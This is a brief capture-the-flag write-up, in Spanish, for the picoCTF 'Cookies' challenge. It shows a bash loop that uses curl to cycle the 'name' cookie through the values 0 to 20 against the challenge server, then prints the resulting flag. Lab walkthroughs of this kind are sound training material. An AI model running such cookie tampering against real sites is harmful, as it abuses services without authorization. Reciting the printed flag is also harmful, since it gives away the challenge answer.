# Cookies
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

## Solución
Con la terminal de Kali Linux
```
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>

```